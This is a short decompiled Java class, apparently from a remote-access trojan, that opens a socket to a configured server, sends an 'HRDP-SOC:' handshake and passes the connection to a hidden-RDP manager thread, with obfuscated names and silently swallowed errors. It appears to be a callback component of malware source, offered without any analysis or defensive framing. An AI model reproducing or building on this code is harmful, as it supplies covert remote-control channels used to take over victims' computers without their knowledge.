package carLambo;

import java.io.OutputStream;
import java.net.Socket;

final class RDPStarter implements dfhdfndfg {
   // $FF: synthetic field
   private RDPManager sdfsldf;

   RDPStarter(RDPManager var1) {
      this.sdfsldf = var1;
      
   }

   public final void start() {
      try {
         Socket var1;
         OutputStream var2 = (var1 = new Socket(ConnectionUtil.socketAddress, ConnectionUtil.socketPort)).getOutputStream();
         String var3 = "HRDP-SOC:";
         var2.write((var3.getBytes().length + "\r\n\r\n").getBytes());
         var2.write(var3.getBytes());
         RDPManager.startThread(this.sdfsldf, var1, this.sdfsldf.sdfsldf);
      } catch (Exception var4) {
         ;
      }
   }
}
